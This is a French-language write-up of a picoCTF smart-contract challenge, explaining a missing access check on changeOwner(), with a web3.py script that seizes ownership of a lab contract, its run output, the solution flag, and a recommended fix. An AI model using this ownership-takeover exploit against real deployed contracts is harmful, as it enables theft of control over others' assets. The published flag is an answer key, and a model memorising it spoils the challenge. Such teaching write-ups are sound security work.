# AccessControl - Writeup

**Points:** 200  
**Author:** OB  
**Challenge Type:** Smart Contract Security / Access Control

## Description

Un contrat Solidity a été créé pour stocker un secret flag. Actuellement, seul le propriétaire du contrat devrait avoir accès au flag, mais il y a une vulnérabilité de contrôle d'accès...

## Challenge Details

- **Contract Address:** `0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9`
- **Ethereum Node:** `lonely-island.picoctf.net:64995`
- **Your Address:** `0xFB2a411B606a95fb94F61948C60e0e9ccE47069f`
- **Gas Balance:** 5 ETH

## Analyse du Contrat

Voici le code du contrat `AccessControl.sol`:

```solidity
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;
    
    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

## Vulnérabilité Identifiée

### Issue Critique: Missing Access Control

La fonction `changeOwner()` est publique et **n'a aucun contrôle d'accès**:

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

**Problème:** N'importe qui peut appeler cette fonction pour devenir propriétaire du contrat!

### Impact

- Un attaquant peut prendre la propriété du contrat
- L'attaquant peut ensuite appeler `solve()` pour révéler le flag
- L'attaquant peut récupérer le flag via `getFlag()`

## Exploitation

### Étape 1: Devenir Propriétaire

Appeler `changeOwner()` avec son adresse pour devenir propriétaire:

```python
change_owner_tx = contract.functions.changeOwner(
    Web3.to_checksum_address(MY_ADDRESS)
).build_transaction({
    'from': Web3.to_checksum_address(MY_ADDRESS),
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price,
})

signed_tx = w3.eth.account.sign_transaction(change_owner_tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
```

**Résultat:** Nouveau propriétaire = `0xFB2a411B606a95fb94F61948C60e0e9ccE47069f`

### Étape 2: Révéler le Flag

Appeler `solve()` pour révéler le flag (maintenant possible car on est propriétaire):

```python
solve_tx = contract.functions.solve().build_transaction({
    'from': Web3.to_checksum_address(MY_ADDRESS),
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price,
})

signed_tx = w3.eth.account.sign_transaction(solve_tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
```

### Étape 3: Récupérer le Flag

Appeler `getFlag()` pour obtenir le flag:

```python
flag = contract.functions.getFlag().call()
print(f"🚩 FLAG: {flag}")
```

## Exécution de l'Exploit

```
✅ Connected to Ethereum node
Chain ID: 31337
Current owner: 0x09DB0a93B389bEF724429898f539AEB7ac2Dd55f
Flag revealed: False

[Step 1] Calling changeOwner() to become the owner...
Transaction sent: f7dea313d16c319d1f03dfd931ab996cf8249d5faf5c5ed8e100fa416231ba9d
✅ Transaction confirmed in block 3
New owner: 0xFB2a411B606a95fb94F61948C60e0e9ccE47069f

[Step 2] Calling solve() to reveal the flag...
Transaction sent: a5e2d866602783120aa79a26546e56e358ea85fef5ab24ec78f1ca7abfb92775
✅ Transaction confirmed in block 4
Flag revealed: True

[Step 3] Retrieving the flag...

🚩 FLAG: picoCTF{i_c4n_b3_0wn3r_cd999ae1}
```

## Flag

```
picoCTF{i_c4n_b3_0wn3r_cd999ae1}
```

## Correction Recommandée

La fonction `changeOwner()` doit inclure un contrôle d'accès:

```solidity
function changeOwner(address _newOwner) public {
    require(msg.sender == owner, "Only the owner can change ownership");
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

## Leçons Apprises

1. **Principe du Moindre Privilège:** Les fonctions sensibles ne doivent jamais être `public` sans contrôle d'accès
2. **Validation des Appelants:** Toujours vérifier que `msg.sender` a les permissions appropriées
3. **Audit de Code:** Les vulnérabilités d'accès contrôle sont parmi les plus critiques dans les smart contracts
4. **Tests:** Tester avec des adresses non-autorisées pour vérifier les contrôles

## Outils Utilisés

- **web3.py:** Pour interagir avec le réseau Ethereum
- **Python 3:** Script d'exploitation
- **Solidity:** Analyse du contrat

## Ressources

- [OpenZeppelin Access Control](https://docs.openzeppelin.com/contracts/4.x/access-control)
- [OWASP Smart Contract Top 10](https://owasp.org/www-project-smart-contract-top-10/)
